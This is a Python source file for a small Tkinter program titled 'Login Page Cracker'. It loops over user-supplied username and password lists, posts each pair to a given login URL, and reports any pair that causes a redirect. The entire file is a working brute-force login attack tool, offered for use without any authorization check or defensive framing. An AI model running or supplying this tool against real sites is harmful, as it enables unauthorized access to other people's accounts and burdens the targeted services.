import requests
from tkinter import Tk, Label, Entry, Button, filedialog, messagebox
import time

def crack_login():
    url = url_entry.get().strip()
    if not url:
        messagebox.showerror("Error", "Please enter the login page URL.")
        return

    username_list_path = filedialog.askopenfilename(title="Select Username List", filetypes=(("Text Files", "*.txt"),))
    password_list_path = filedialog.askopenfilename(title="Select Password List", filetypes=(("Text Files", "*.txt"),))

    if not username_list_path or not password_list_path:
        messagebox.showerror("Error", "Please select both username and password files.")
        return

    start_time = time.time()

    try:
        with open(username_list_path, "r") as user_file, open(password_list_path, "r") as pass_file:
            usernames = user_file.read().splitlines()
            passwords = pass_file.read().splitlines()

        for username in usernames:
            for password in passwords:
                print(f"Trying username: {username} with password: {password}")
                
                # Send POST request
                response = requests.post(url, data={"username": username, "password": password}, allow_redirects=True)

                # Check if the URL has changed
                if response.url != url:
                    elapsed_time = time.time() - start_time
                    messagebox.showinfo(
                        "Success",
                        f"Login successful!\nUsername: {username}\nPassword: {password}\nTime taken: {elapsed_time:.2f} seconds"
                    )
                    return

            print(f"Failed for username: {username}")

        # If no valid combination is found
        messagebox.showwarning("Failure", "No valid username-password combination found.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

# GUI setup
root = Tk()
root.title("Login Page Cracker")

Label(root, text="Enter Login Page URL:").pack(pady=5)
url_entry = Entry(root, width=50)
url_entry.pack(pady=5)

crack_button = Button(root, text="Start Cracking", command=crack_login)
crack_button.pack(pady=10)

root.geometry("400x200")
root.mainloop()
